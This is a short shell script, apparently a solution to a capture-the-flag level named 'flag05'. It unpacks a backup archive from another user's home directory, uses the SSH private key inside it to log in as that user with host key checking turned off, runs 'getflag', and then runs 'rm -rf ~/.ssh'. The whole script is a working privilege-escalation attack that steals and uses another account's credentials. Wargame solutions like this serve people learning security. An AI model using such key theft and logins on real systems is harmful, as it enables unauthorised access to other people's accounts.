set -x
tar -xzvf /home/flag05/.backup/backup-19072011.tgz -C ~/
ssh -i ~/.ssh/id_rsa -oStrictHostKeyChecking=no flag05@localhost 'whoami; getflag; exit'
rm -rf ~/.ssh
exit 0
